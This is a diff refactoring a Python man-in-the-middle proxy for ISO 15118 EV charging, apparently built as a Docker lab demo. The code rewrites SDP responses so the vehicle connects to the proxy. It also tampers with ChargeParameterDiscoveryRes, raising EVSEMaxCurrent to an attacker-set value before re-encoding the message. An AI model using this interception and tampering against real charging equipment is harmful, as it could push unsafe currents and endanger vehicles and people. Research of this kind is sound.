@@ -9,7 +9,7 @@ Features:
   • Optional packet capture & hex preview
 """
 
-import sys, os, json, socket, asyncio, struct, ipaddress, re, concurrent.futures, datetime, argparse
+import sys, os, json, socket, asyncio, datetime, argparse
 
 # --------------------------------------------------------------------
 # CLI options
@@ -47,225 +47,21 @@ TAMPER_NEW_CURRENT_A = int(os.environ.get("TAMPER_CURRENT_A", "63"))
 # Project setup
 # --------------------------------------------------------------------
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
-from iso15118.shared.exificient_exi_codec import ExificientEXICodec as _RealExificientEXICodec
+
+from common import (
+    SECC_NET_V4, SECC_NET_V6, EVCC_NET_V4, EVCC_NET_V6,
+    ProxyCodec, decode_with_fallback,
+    discover_secc_evcc_interfaces,
+    parse_response, create_new_response_message,
+    read_v2gtp_message, tamper_charge_parameter_discovery_res,
+    MSG_DEF_NS,
+)
 
 LISTEN_HOST = '::'
 UDP_PORT = 15118
 SDP_MULTICAST_GROUP = 'ff02::1'
 SDP_SERVER_PORT = 15118
 proxy_port = 55000
-
-APP_PROTOCOL_NS = "urn:iso:15118:2:2010:AppProtocol"
-MSG_DEF_NS = "urn:iso:15118:2:2013:MsgDef"
-
-executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
-
-# --------------------------------------------------------------------
-# SECC/EVCC network identity (subnet-based, not interface-list-order-based)
-# --------------------------------------------------------------------
-# These are the subnets proxy_net1 (SECC-facing) and proxy_net2 (EVCC-facing)
-# are created with (see run_full_demo.sh / README "One-time setup"). Docker
-# does not guarantee that eth0/eth1 map to proxy_net1/proxy_net2 in a stable
-# order across container restarts or `docker network connect` calls, so we
-# identify each interface by which of these subnets it's actually on,
-# instead of assuming "first interface = SECC, second = EVCC".
-SECC_NET_V4 = ipaddress.ip_network("172.20.0.0/16")
-SECC_NET_V6 = ipaddress.ip_network("2001:db8:1::/64")
-EVCC_NET_V4 = ipaddress.ip_network("172.19.0.0/16")
-EVCC_NET_V6 = ipaddress.ip_network("2001:db8:2::/64")
-
-iface_header_pattern = re.compile(r'^(\d+):\s+(\S+?)(?:@\S+)?:')
-inet4_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)/\d+')
-inet6_global_pattern = re.compile(r'inet6 ([\da-fA-F:]+)/\d+ scope global')
-inet6_link_pattern = re.compile(r'inet6 ([\da-fA-F:]+)/\d+ scope link')
-
-# --------------------------------------------------------------------
-# EXI Codec Wrapper
-# --------------------------------------------------------------------
-# The original hand-rolled version of this class here only implemented
-# decode() (not encode()/get_version()), which IEXICodec's ABC requires --
-# so `ExificientEXICodec()` raised `TypeError: Can't instantiate abstract
-# class ... with abstract methods encode, get_version` the moment --debug
-# was used, silently killing every session it was tried on. Fixed by
-# reusing the real, complete codec the SECC/EVCC processes themselves use
-# (iso15118.shared.exificient_exi_codec.ExificientEXICodec) instead of a
-# partial reimplementation -- this also guarantees encode()'s output stays
-# schema-compatible with whatever this iso15118 version actually expects,
-# which a hand-rolled encoder would risk getting subtly wrong.
-class ProxyCodec:
-    _shared = None
-
-    def __init__(self):
-        if ProxyCodec._shared is None:
-            ProxyCodec._shared = _RealExificientEXICodec()
-        self._codec = ProxyCodec._shared
-
-    async def decode(self, stream: bytes, namespace: str) -> str:
-        loop = asyncio.get_running_loop()
-        return await loop.run_in_executor(None, self._codec.decode, stream, namespace)
-
-    async def encode(self, message: str, namespace: str) -> bytes:
-        loop = asyncio.get_running_loop()
-        return await loop.run_in_executor(None, self._codec.encode, message, namespace)
-
-
-async def decode_with_fallback(codec, payload: bytes):
-    """
-    Try decoding a V2GTP payload against each known namespace in turn.
-    Only the very first message on a session (SupportedAppProtocolReq/Res)
-    uses APP_PROTOCOL_NS; everything after that uses MSG_DEF_NS. Returns
-    (decoded_dict, namespace) or (None, None) if nothing matched.
-    """
-    for ns in (APP_PROTOCOL_NS, MSG_DEF_NS):
-        try:
-            decoded = await codec.decode(payload, ns)
-            return json.loads(decoded), ns
-        except Exception:
-            continue
-    return None, None
-
-# --------------------------------------------------------------------
-# Helpers
-# --------------------------------------------------------------------
-async def discover_secc_evcc_interfaces(secc_iface=None, evcc_iface=None):
-    """
-    Identify which local interface faces SECC's network (proxy_net1) and
-    which faces EVCC's (proxy_net2).
-
-    Default (secc_iface/evcc_iface both None): match each interface's
-    actual assigned subnet (IPv4 and/or global IPv6) against the known
-    SECC_NET_*/EVCC_NET_* ranges. This is self-correcting regardless of
-    which order the interfaces were connected in -- it does not rely on
-    `ip a` listing order at all. This is what the Docker demo
-    (run_full_demo.sh etc.) relies on.
-
-    If secc_iface/evcc_iface are given (--secc-iface/--evcc-iface on the
-    CLI), match by interface name instead -- for real hardware, where the
-    physical NICs won't be on proxy_net1's/proxy_net2's specific Docker
-    subnets, so the caller names them explicitly (e.g. "eth0"/"eth1").
-
-    Returns {"secc": (link_local_addr, scope_id), "evcc": (link_local_addr, scope_id)},
-    with a role missing if no interface matched.
-    """
-    result = await asyncio.create_subprocess_shell('ip a', stdout=asyncio.subprocess.PIPE)
-    stdout, _ = await result.communicate()
-    lines = stdout.decode().splitlines()
-
-    interfaces = {}  # scope_id -> {"name": str, "v4": str, "v6_global": str, "v6_link": str}
-    current_scope_id = None
-    for line in lines:
-        header_match = iface_header_pattern.match(line)
-        if header_match:
-            current_scope_id = int(header_match.group(1))
-            interfaces[current_scope_id] = {"name": header_match.group(2)}
-            continue
-        if current_scope_id is None:
-            continue
-        v4_match = inet4_pattern.search(line)
-        if v4_match:
-            interfaces[current_scope_id]["v4"] = v4_match.group(1)
-        v6_global_match = inet6_global_pattern.search(line)
-        if v6_global_match:
-            interfaces[current_scope_id]["v6_global"] = v6_global_match.group(1)
-        v6_link_match = inet6_link_pattern.search(line)
-        if v6_link_match:
-            interfaces[current_scope_id]["v6_link"] = v6_link_match.group(1)
-
-    if secc_iface or evcc_iface:
-        by_name = {addrs["name"]: (scope_id, addrs) for scope_id, addrs in interfaces.items()}
-        roles = {}
-        for role, wanted_name in (("secc", secc_iface), ("evcc", evcc_iface)):
-            if not wanted_name:
-                continue
-            if wanted_name not in by_name:
-                print(f"WARNING: --{role}-iface {wanted_name} not found in `ip a` output")
-                continue
-            scope_id, addrs = by_name[wanted_name]
-            link = addrs.get("v6_link")
-            if not link:
-                print(f"WARNING: {wanted_name} (--{role}-iface) has no link-local IPv6 "
-                      f"address -- is the interface up?")
-                continue
-            roles[role] = (link, scope_id)
-        return roles
-
-    def identify_role_by_subnet(addrs):
-        v4 = addrs.get("v4")
-        v6g = addrs.get("v6_global")
-        try:
-            if v4 and ipaddress.ip_address(v4) in SECC_NET_V4:
-                return "secc"
-            if v4 and ipaddress.ip_address(v4) in EVCC_NET_V4:
-                return "evcc"
-            if v6g and ipaddress.ip_address(v6g) in SECC_NET_V6:
-                return "secc"
-            if v6g and ipaddress.ip_address(v6g) in EVCC_NET_V6:
-                return "evcc"
-        except ValueError:
-            pass
-        return None
-
-    roles = {}
-    for scope_id, addrs in interfaces.items():
-        link = addrs.get("v6_link")
-        if not link:
-            continue
-        role = identify_role_by_subnet(addrs)
-        if role:
-            roles[role] = (link, scope_id)
-
-    return roles
-
-def parse_response(hex_data):
-    data = bytes.fromhex(hex_data)
-    return {
-        'Version': data[0],
-        'Message Type': data[1],
-        'Message Length': int.from_bytes(data[2:4], 'big'),
-        'Reserved': int.from_bytes(data[4:8], 'big'),
-        'SECC IP Address': str(ipaddress.IPv6Address(data[8:24])),
-        'SECC Port': int.from_bytes(data[24:26], 'big'),
-        'Security': data[26],
-        'Transport Protocol': data[27],
-    }
-
-def create_new_response_message(original_message, new_ip, new_port):
-    new_ip_bytes = ipaddress.IPv6Address(new_ip).packed
-    new_port_bytes = new_port.to_bytes(2, 'big')
-    return original_message[:8] + new_ip_bytes + new_port_bytes + original_message[26:]
-
-async def read_v2gtp_message(reader):
-    """
-    Read exactly one V2GTP message: an 8-byte header (1B version, 1B
-    inverse version, 2B payload type, 4B payload length) followed by
-    exactly that many payload bytes. Used for every plaintext message, not
-    just the first -- both to make sure SECC/EVCC always receive one
-    complete message per write (see the framing-bug note in handle_client)
-    and because tampering needs reliable message boundaries to decode.
-    Raises asyncio.IncompleteReadError on a clean EOF.
-    """
-    header = await reader.readexactly(8)
-    payload_length = int.from_bytes(header[4:8], "big")
-    payload = await reader.readexactly(payload_length)
-    return header, payload
-
-def tamper_charge_parameter_discovery_res(decoded):
-    """
-    If `decoded` is a ChargeParameterDiscoveryRes, bump AC_EVSEChargeParameter
-    .EVSEMaxCurrent.Value to TAMPER_NEW_CURRENT_A in place and return the
-    original value. Returns None (no change made) if this isn't that
-    message, or if the expected AC field path isn't present (e.g. a DC
-    session, which uses DC_EVSEChargeParameter instead -- left alone rather
-    than guessing at a DC-specific field to tamper).
-    """
-    try:
-        charge_param_res = decoded["V2G_Message"]["Body"]["ChargeParameterDiscoveryRes"]
-        max_current = charge_param_res["AC_EVSEChargeParameter"]["EVSEMaxCurrent"]
-    except (KeyError, TypeError):
-        return None
-    original_value = max_current["Value"]
-    max_current["Value"] = TAMPER_NEW_CURRENT_A
-    return original_value
 
 # --------------------------------------------------------------------
 # UDP SDP Proxy (Python 3.8 safe)
@@ -417,7 +213,8 @@ async def handle_client(client_reader, client_writer):
                     if decoded is not None:
                         if (TAMPER_ENABLED and direction == "SECC→EVCC"
                                 and ns == MSG_DEF_NS):
-                            original_value = tamper_charge_parameter_discovery_res(decoded)
+                            original_value = tamper_charge_parameter_discovery_res(
+                                decoded, TAMPER_NEW_CURRENT_A)
                             if original_value is not None:
                                 new_payload = await codec.encode(json.dumps(decoded), MSG_DEF_NS)
                                 out_header = header[0:4] + len(new_payload).to_bytes(4, "big")
